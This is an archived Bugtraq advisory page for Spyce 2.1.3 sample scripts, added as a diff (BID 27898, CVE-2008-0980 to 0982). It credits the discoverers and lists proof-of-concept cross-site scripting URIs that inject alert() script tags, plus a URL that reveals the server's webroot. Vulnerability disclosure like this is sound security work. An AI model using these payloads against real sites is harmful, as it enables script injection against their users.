@@ -1,0 +1,101 @@
+#SpeeDr00t@Black Falcon<br>#bid27898<p><b><span style="font-size: 18pt;">Spyce Sample Scripts Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/27898/info">info</a><br><a href="http://www.securityfocus.com/bid/27898/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/27898/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/27898/solution">solution</a><br><a href="http://www.securityfocus.com/bid/27898/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				27898
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2008-0982<br/>
+				
+					CVE-2008-0980<br/>
+				
+					CVE-2008-0981<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Feb 19 2008 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jul 06 2016 02:17PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Richard Brain, Jan Fry, and Bruno Kovacs of ProCheckUp Ltd discovered these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					Spyce Spyce 2.1.3 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can exploit these issues by enticing an unsuspecting user to follow a malicious URI.<br/><br/>The following proof-of-concept URIs are available:<br/><br/>http://www.example.com/docs/examples/redirect.spy?url=%3CSCRIPT%3Ealert('Can%20Cross%20Site%20Attack')%3C/SCRIPT%3E&amp;amp;type=internal<br/>http://www.example.com/docs/examples/handlervalidate.spy?x="&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('Can%20Cross%20Site%20Attack')&amp;lt;/SCRIPT&amp;gt;<br/>http://www.example.com/spyce/examples/request.spy?name="/&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('Can%20Cross%20Site%20Attack')&amp;lt;/SCRIPT&amp;gt;<br/>http://www.example.com/spyce/examples/getpost.spy?Name="/&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('Can%20Cross%20Site%20Attack')&amp;lt;/SCRIPT&amp;gt;<br/>http://www.example.com/spyce/examples/formtag.spy?="/&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('Can%20Cross%20Site%20Attack')&amp;lt;/SCRIPT&amp;gt;&amp;amp;foo=Submit!&amp;amp;mycheck=check1&amp;amp;mypass=secret&amp;amp;myradio=radio_option1&amp;amp;mytext=some&amp;amp;mytextarea=&amp;lt;/textarea&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('Can%20Cross%20Site%20Attack')&amp;lt;/SCRIPT&amp;gt;<br/>http://www.example.com/spyce/examples/formtag.spy?mypass=%22/%3E%3Cscript%3Ealert(1)%3C/script%3E<br/><br/>Requesting the following URL returns the server's webroot:<br/>http://www.example.com/spyce/examples/automaton.spy
+	
+		<ul>
+</ul>
+</div>
